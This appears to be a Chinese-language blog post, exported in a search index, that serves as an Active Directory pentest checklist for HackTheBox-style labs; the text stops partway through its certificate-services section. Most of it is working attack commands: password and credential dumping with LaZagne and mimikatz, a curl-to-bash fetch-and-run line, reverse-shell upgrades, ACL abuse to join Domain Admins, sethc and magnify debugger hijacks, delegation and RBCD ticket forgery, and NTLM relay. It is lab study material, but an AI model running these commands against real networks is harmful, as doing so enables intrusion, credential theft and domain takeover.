<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Domain-Checklist</title>
      <link href="/2023/04/21/Domain-Checklist/"/>
      <url>/2023/04/21/Domain-Checklist/</url>
      
        <content type="html"><![CDATA[<h2 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#windows密码</span></span><br><span class="line">findstr /si pass *.config *.ini *user* *pass*  *.xml *.cgi *.bak &gt; password.txt <span class="comment">#获取密码文件</span></span><br><span class="line"></span><br><span class="line">Seatbelt.exe -group=all -full -outputfile=3.txt <span class="comment">#东西太多了</span></span><br><span class="line"></span><br><span class="line">LaZagne.exe all  &gt;1.txt <span class="comment">#浏览器和各种软件密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#windows powerup</span></span><br><span class="line"></span><br><span class="line">use exploit/windows/local/service_permissions <span class="comment">#服务提权</span></span><br><span class="line"></span><br><span class="line">powershell -ep bypass -c <span class="string">&quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck&quot;</span> <span class="comment">#也是服务提权</span></span><br><span class="line"></span><br><span class="line">. .\PrivescCheck.ps1 <span class="comment">#先导入ps1脚本</span></span><br><span class="line"></span><br><span class="line">Invoke-PrivescCheck -Extended -Report <span class="string">&quot;PrivescCheck_<span class="subst">$($env:COMPUTERNAME)</span>&quot;</span> -Format TXT,CSV,HTML,XML <span class="comment">#输出为html 要全部上传这个文件夹</span></span><br><span class="line"></span><br><span class="line">systeminfo &gt;sys.txt</span><br><span class="line"></span><br><span class="line">python wes.py --update <span class="comment">#更新脚本</span></span><br><span class="line"></span><br><span class="line">python wes.py sys.txt <span class="comment">#查询</span></span><br><span class="line"></span><br><span class="line">WinPEAS.exe <span class="comment">#也是辅助提权</span></span><br><span class="line"></span><br><span class="line">mimikatz抓取密码和sharphound获取域内信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#linux</span></span><br><span class="line">pspy64 是看root进程的</span><br><span class="line">linux-exploit-suggester-2.pl 是查看linux内核提权漏洞的</span><br><span class="line">LinEnum.sh 和linuxprivchecker.py 是信息收集的 收集find crontab password等信息</span><br><span class="line"></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">典型的PrivESC to root with CVE-2022-2588（pwnkit,pkexec)</span><br><span class="line"></span><br><span class="line">配置文件 .mysql .bash .ssh .<span class="built_in">env</span> </span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all <span class="comment">#查询dns服务器</span></span><br><span class="line"></span><br><span class="line">net time /domain </span><br><span class="line"></span><br><span class="line">ping -4 dc.htb.local -n 3 <span class="comment">#强制ipv4</span></span><br><span class="line"></span><br><span class="line">nltest /domain_trusts </span><br><span class="line"></span><br><span class="line">netspy.exe is -o route.txt <span class="comment">#查询网段,用icmp</span></span><br><span class="line"></span><br><span class="line">route <span class="built_in">print</span> <span class="comment">#也是查询路由</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr <span class="string">&quot;TTL=&quot;</span> <span class="comment">#命令行ping</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htb基础checklist</span><br><span class="line"></span><br><span class="line">nmap -p- -sT --min-rate=1000 -Pn 10.129.221.221  <span class="comment">#tcp协议</span></span><br><span class="line"></span><br><span class="line">nmap -p- -sU --min-rate=1000 -Pn 10.129.221.221  <span class="comment">#获取udp协议的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#整理开放端口</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> port.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> port.txt |awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>|<span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span></span><br><span class="line"></span><br><span class="line">nmap -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49714 -Pn -sT -sC -sV  10.129.221.221</span><br><span class="line"></span><br><span class="line">curl 10.10.14.8:8000/1.txt|bash</span><br><span class="line"></span><br><span class="line">ldap查询</span><br><span class="line"></span><br><span class="line">ldapsearch -H ldap://flight.htb  -x -s base -b <span class="string">&#x27;&#x27;</span> <span class="string">&quot;(objectClass=*)&quot;</span> <span class="string">&quot;*&quot;</span> +</span><br><span class="line"></span><br><span class="line">smbclient</span><br><span class="line"></span><br><span class="line">smbclient -L //10.10.11.175 -N</span><br><span class="line"></span><br><span class="line">smbmap -H 10.10.11.175 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rpc匿名登录</span><br><span class="line">rpcclient -U <span class="string">&#x27;&#x27;</span>-N 10.10.10.182</span><br><span class="line">rpcmap.py <span class="string">&#x27;ncacn_ip_tcp:10.10.10.213&#x27;</span></span><br><span class="line"></span><br><span class="line">rpc命令</span><br><span class="line"></span><br><span class="line">列出域用户 enumdomusers netsharegetinfo netsharesetinfo srvinfo querydispinfo</span><br><span class="line"></span><br><span class="line">houndblood 首先查询出站控制权限</span><br><span class="line"></span><br><span class="line"><span class="comment">#优化反弹shell</span></span><br><span class="line"></span><br><span class="line">script /dev/null -c bash</span><br><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color <span class="comment">#允许 clear，并且有颜色</span></span><br><span class="line"></span><br><span class="line">CTRL + Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span></span><br><span class="line">reset</span><br><span class="line"></span><br><span class="line">rlwrap -cAr nc -lnvp 4434 <span class="comment">#修改windows shell</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/21/Domain-Checklist/image-20230421133719964-16824243284807.png" alt="image-20230421133719964"></p><p><img src="/2023/04/21/Domain-Checklist/image-20230421133844688-16824243284808.png" alt="image-20230421133844688"></p><p><img src="/2023/04/21/Domain-Checklist/image-20230421134309256-16824243284809.png" alt="image-20230421134309256"></p><h3 id="特权利用"><a href="#特权利用" class="headerlink" title="特权利用"></a>特权利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">ForceChangePassword：强制改变当下的密码</span><br><span class="line"></span><br><span class="line">AddMembers：可以对目标组添加用户（包括自己的账户）</span><br><span class="line"></span><br><span class="line">GenericAll：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面</span><br><span class="line"></span><br><span class="line">GenericWrite:更改目标写入参数，导致下次用户登录脚本就要执行</span><br><span class="line"></span><br><span class="line">WriteOwner：更新目标对象的所有者，可以让自己成为所有者</span><br><span class="line"></span><br><span class="line">WriteDACL：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权，我们就可以进行dcsync</span><br><span class="line"></span><br><span class="line">AllExtendedRights：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ForceChangePassword 修改密码</span></span><br><span class="line">upload PowerView.ps1</span><br><span class="line"></span><br><span class="line">. .\PowerView.ps1</span><br><span class="line"><span class="variable">$newpass</span> = ConvertTo-SecureString <span class="string">&#x27;111qwe!!!&#x27;</span> -AsPlainText -Force</span><br><span class="line"></span><br><span class="line">Set-DomainUserPassword -Identity smith -AccountPassword <span class="variable">$newpass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GenericWrite</span></span><br><span class="line"></span><br><span class="line">GenericWrite对用户使用来更新他们的登录脚本。该脚本将在用户下次登录时运行</span><br><span class="line"></span><br><span class="line">不确定：更改用户密码 设置spn进行Kerberoast 然后hashcat破解<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">设置spn</span><br><span class="line"></span><br><span class="line">Set-DomainObject -Identity maria -SET @&#123;serviceprincipalname=<span class="string">&#x27;nonexistent/0XDF&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">setspn -a MSSQLSvc/object.local:1433 object.local\maria</span><br><span class="line"></span><br><span class="line">Get-DomainUser maria | Select serviceprincipalname</span><br><span class="line"></span><br><span class="line">创建凭据也就是smith的shell都不行</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span> = ConvertTo-SecureString <span class="string">&#x27;0xdf0xdf!&#x27;</span> -AsPlainText -Force </span><br><span class="line"><span class="variable">$cred</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;object.local\smith&#x27;</span>, <span class="variable">$pass</span>)</span><br><span class="line">Get-DomainSPNTicket -SPN <span class="string">&quot;MSSQLSvc/object.local:1433&quot;</span> -Credential <span class="variable">$Cred</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">出来一段<span class="built_in">hash</span>，但是不好破解</span><br><span class="line"></span><br><span class="line">Hash : $krb5tgs$23$*UNKNOWN$UNKNOWN<span class="variable">$MSSQLSvc</span>/object.local:1433*<span class="variable">$HASH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">修改密码也不行</span><br><span class="line"></span><br><span class="line"><span class="variable">$newpass</span> = ConvertTo-SecureString <span class="string">&#x27;0xdf0xdf!&#x27;</span> -AsPlainText -Force</span><br><span class="line">Set-DomainUserPassword -Identity maria -AccountPassword <span class="variable">$newpass</span></span><br><span class="line"></span><br><span class="line">那么只能修改登录脚本了，我们smith对maria有GenericWrite特权，这需要maria登录的时候才会触发，如果靶机有bot就可以利用了</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> C:\programdata </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ping 10.10.14.6&quot;</span> &gt; ping.ps1</span><br><span class="line">Set-DomainObject -Identity maria -SET @&#123;scriptpath=<span class="string">&quot;C:\\programdata\\ping.ps1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">发现不出网，也就是弹不了shell 是不是可以考虑修改密码呢（好像没用原密码也修改不了）？ 那只能找该用户的敏感文件了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#WriteOwner</span></span><br><span class="line"></span><br><span class="line">通过进入maria的powershell</span><br><span class="line"></span><br><span class="line">Set-DomainObjectOwner -Identity <span class="string">&#x27;Domain Admins&#x27;</span> -OwnerIdentity <span class="string">&#x27;maria&#x27;</span> <span class="comment">#加入组拥有者</span></span><br><span class="line"></span><br><span class="line">Add-DomainObjectAcl -TargetIdentity <span class="string">&quot;Domain Admins&quot;</span> -PrincipalIdentity maria -Rights All <span class="comment">#给所有权力</span></span><br><span class="line"></span><br><span class="line">Add-DomainGroupMember -Identity <span class="string">&#x27;Domain Admins&#x27;</span> -Members <span class="string">&#x27;maria&#x27;</span> <span class="comment">#拉入组</span></span><br><span class="line"></span><br><span class="line">重启会话就是domain admin了</span><br><span class="line"></span><br><span class="line">以上需要先导入powerview.ps1模块 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">判断拿到的windows权限，如果是服务账户可以用土豆家族</span><br><span class="line"></span><br><span class="line">sweetpotato.exe 也可以用rbcd提权SharpAllowedToAct.exe（服务出网是system权限）</span><br><span class="line"></span><br><span class="line">域用户可以用krbrelayup直接提权，或者有writedacl 直接rbcd自己提权</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域内工具</span><br><span class="line"></span><br><span class="line">crackmapexec</span><br><span class="line"></span><br><span class="line">bloodyAD </span><br><span class="line"></span><br><span class="line">adfind.exe</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br><span class="line"></span><br><span class="line">注册表开启3389</span><br><span class="line"></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">REG query <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> | findstr <span class="string">&quot;DisableRestrictedAdmin&quot;</span>   <span class="comment"># 查看是否成功开启</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">通过修改注册表开启wdigest</span><br><span class="line"></span><br><span class="line"><span class="comment">#Enable Wdigest 开启</span></span><br><span class="line">C:\Users\Administrator\Desktop&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Wdigest</span></span><br><span class="line">C:\Users\Administrator\Desktop&gt; reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">但这是适用于 Credential Guard 禁用的情况下，如果目标系统开启了 Credential Guard 保护，即便将 g_fParameter_UseLogonCredential 值设为 1 也无法让 Wdigest 缓存明文凭据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看注册表权限</span><br><span class="line"></span><br><span class="line">get-acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl *</span><br><span class="line"></span><br><span class="line">劫持五次<span class="built_in">shift</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br><span class="line"></span><br><span class="line">劫持放大镜</span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure><h2 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h2><h3 id="触发委派"><a href="#触发委派" class="headerlink" title="触发委派"></a>触发委派</h3><p>1.printspooler（打印机漏洞）<br>2.DFSCoerce<br>3.PetitPotam</p><p>委派针对的是服务账户，也就是机器账户才能注册成为服务账户，而域用户可以创建机器账户，然后注册成服务账户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#非约束委派</span></span><br><span class="line"></span><br><span class="line">域控访问过本机</span><br><span class="line"></span><br><span class="line">直接导出票据</span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">然后再导入就行</span><br><span class="line">kerberos::ptt C:\Users\wp\Desktop\mimikatz_trunk\x64\[0;b04bb5]-2-0-60a10000-Administrator@krbtgt-WPSEC.COM.kirbi</span><br><span class="line"></span><br><span class="line">域控未访问，需要用上面触发委派，然后用Rubeus.exe监听</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#约束委派</span></span><br><span class="line"></span><br><span class="line">1.首先利用域用户进行获取机器用户的tgt</span><br><span class="line"></span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:yuwin7 /password:yuwin7.com /domain:test.lab /ticket:s4u.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#/user: 服务⽤户的⽤户名</span></span><br><span class="line"><span class="comment">#/password: 服务⽤户的明⽂密码</span></span><br><span class="line"><span class="comment">#/domain: 所在域名</span></span><br><span class="line"><span class="comment">#/ticket: 指定票据名称，不过这个参数没有⽣效，可以忽略</span></span><br><span class="line"> </span><br><span class="line">kekeo <span class="string">&quot;tgt::ask /user:yuwin7 /NTLM:XXXXX /domain:test.lab&quot;</span> <span class="comment">#使用hash</span></span><br><span class="line"></span><br><span class="line">2.然后用机器账户的tgt进行获取dc的cifs票据，通过s4u</span><br><span class="line"></span><br><span class="line">kekeo <span class="string">&quot;tgs::s4u /tgt:TGT_yuwin7@TEST.LAB_krbtgt~test.lab@TEST.LAB.kirbi /user:Administrator /service:cifs/DC.test.lab&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当然也可以直接获取机器账户<span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">也可以上传rubeus.exe s4u /user:admin-pc$ /rc4:cfb666bd42ba3d191138b82631eb6e85 /domain:test.lab /impersonateuser:administrator /msdsspn:cifs/dc.test.lab /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt;2.txt</span><br></pre></td></tr></table></figure><h3 id="RBCD"><a href="#RBCD" class="headerlink" title="RBCD"></a>RBCD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">涉及ntlm-relay和MAQ=0 </span><br><span class="line"></span><br><span class="line">添加机器用户的方式有2中SAMR,LDAPS，samr添加的机器账户没用spn 和upn</span><br><span class="line"></span><br><span class="line">https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ</span><br><span class="line"></span><br><span class="line">1.提权本地，通过服务账户添加机器账户并且设置rbcd </span><br><span class="line"></span><br><span class="line">其中-m参数为你添加的机器账号，-p为密码，-t为准备要攻击的机器名，-a为域控地址，-d为域名，如：</span><br><span class="line"></span><br><span class="line">SharpAllowedToAct.exe -m serviceE -p 123456 -t sqlserver -a dc.de1ay.com -d de1ay.com</span><br><span class="line"></span><br><span class="line">2.提权域管</span><br><span class="line"></span><br><span class="line">配合ntlm-relay 和上面触发委派的漏洞</span><br><span class="line"></span><br><span class="line">addcomputer.py -method SAMR -dc-ip 10.10.10.142 -computer-name machine -computer-pass pass@123 <span class="string">&quot;redteam.club/hack:pass@123&quot;</span></span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://10.10.10.142 -smb2support --remove-mic --delegate-access --escalate-user machine$ -debug</span><br><span class="line"></span><br><span class="line">printerbug.py redteam.club/hack:pass@123@10.10.10.140 10.10.10.128</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getST.py -dc-ip 10.10.10.142 redteam/machine$:pass@123 -spn cifs/ad2.redteam.club -impersonate administrator</span><br><span class="line"></span><br><span class="line">3.rbcd常规利用可以直接用bloodyAD</span><br><span class="line"></span><br><span class="line">bloodyAD -d support.htb -u support -p <span class="string">&#x27;Ironside47pleasure40Watchful&#x27;</span> --host 10.10.11.174 addComputer machine <span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line">bloodyAD -d support.htb -u support -p <span class="string">&#x27;Ironside47pleasure40Watchful&#x27;</span> --host 10.10.11.174 setRbcd machine\$ dc\$ <span class="comment">#dc\$是dc机器账户</span></span><br><span class="line"></span><br><span class="line">getST.py support.htb/machine\$:root -spn cifs/dc.support.htb -dc-ip 10.10.11.174 -impersonate administrator</span><br><span class="line"></span><br><span class="line">4.maq=0就找createsid</span><br></pre></td></tr></table></figure><h2 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM-Relay"></a>NTLM-Relay</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1.怎么发起ntlm请求（1.printspooler（打印机漏洞），2.DFSCoerce，3.PetitPotam）<br>2.拿到ntlm请求之后要做什么<br>3.服务端是否要求签名-默认策略是协商签名，而且是由client协商签名的</p><p>那么第二点其实能做的事情很多,例如给用户加dacl，让用户可以获取dcsync权限或者直接拿到票据，典型的漏洞有几个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MS08-068</span><br><span class="line">CVE-2015-0005</span><br><span class="line">MS16-075，还有很多potato</span><br><span class="line">CVE-2018-8581，exchange的ssrf</span><br><span class="line">CVE-2019-1040 绕过ntlm的mic</span><br><span class="line">CVE-2019-1384-Ghost potato，这个漏洞绕过了MS08-068之后，用户不能relay回本机的限制</span><br></pre></td></tr></table></figure><p>第三点签名，域内有很多认证方式 smb（smbv1 smbv2 smbv3 ） ldap ldaps http https dns PKINIT  kerberos mssql</p><p>其中有没有可能能进行kerberos-relay呢，答案是可以的</p><h3 id="打法"><a href="#打法" class="headerlink" title="打法"></a>打法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#其中涉及一些端口转发和socket代理，还有协议支持，dns欺骗等等</span></span><br><span class="line"></span><br><span class="line">1.常规打法就是配合上面那些漏洞，例如mic绕过</span><br><span class="line"></span><br><span class="line">2.webdav打法，用WebclientServiceScanner-master进行扫描webclient服务，msDS-KeyCredentialLink 或 msDS-AllowedToActOnBehalfOfOtherIdentity属性，并最终通过 Shadow Credentials 或 RBCD 等方法提升权限</span><br><span class="line"></span><br><span class="line">3.使用 MITM6 通过 DNS 中继 Kerberos 身份验证krbrelayx.py</span><br><span class="line"></span><br><span class="line">4.Inveigh结合DNS v6配合NTLM Relay ----- 通过Inveigh工具内网投毒，欺骗ipv6的DNS服务器，进行WPAD欺骗，结合NTLM Relay攻击链进行利用（使用 MITM6 中继 WPAD 身份验证）-----WPAD（Web Proxy Auto-Discovery Protocol）是Web代理自动发现协议的简称</span><br></pre></td></tr></table></figure><h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><h3 id="1-Shadow-Credentials"><a href="#1-Shadow-Credentials" class="headerlink" title="1.Shadow Credentials"></a>1.Shadow Credentials</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 